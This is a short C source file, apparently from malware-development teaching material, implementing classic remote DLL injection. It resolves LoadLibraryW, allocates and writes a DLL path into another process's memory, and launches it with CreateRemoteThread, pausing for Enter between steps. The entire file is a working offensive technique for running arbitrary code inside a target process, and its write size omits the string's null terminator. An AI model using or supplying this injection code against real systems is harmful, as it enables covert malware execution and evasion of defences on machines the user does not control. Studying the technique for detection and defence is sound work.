#include "DLLInjection.h"

BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) {
	LPVOID	pLoadLibraryW			= NULL;
	LPVOID	pAddress				= NULL;
	HANDLE	hThread					= NULL;
	DWORD	dwSizeToWrite			= lstrlenW(DllName) * sizeof(WCHAR);
	SIZE_T	lpNumberOfBytesWritten	= 0;


	pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	if (!pLoadLibraryW) {
		printf("[!] GetProcAddress failed with Error: %d\n", GetLastError());
		goto _RETURN;
	}
	pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!pAddress) {
		printf("[!] VirtualAllocEx failed with Error: %d\n", GetLastError());
		goto _RETURN;
	}


	printf("[i] pAddress Allocated At : 0x%p Of Size : %d\n", pAddress, dwSizeToWrite);
	printf("[#] Press <Enter> To Write ... ");
	getchar();

	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten)) {
		printf("[!] WriteProcessMemory failed with Error: %d\n", GetLastError());
		goto _RETURN;
	}

	printf("[i] Successfully Written %d Bytes\n", lpNumberOfBytesWritten);
	printf("[#] Press <Enter> To Run ... ");
	getchar();

	hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
	if (!hThread) {
		printf("[!] CreateRemoteThread failed with Error: %d\n", GetLastError());
		goto _RETURN;
	}

_RETURN:
	if (!hThread)
		return FALSE;
	CloseHandle(hThread);
	return TRUE;
}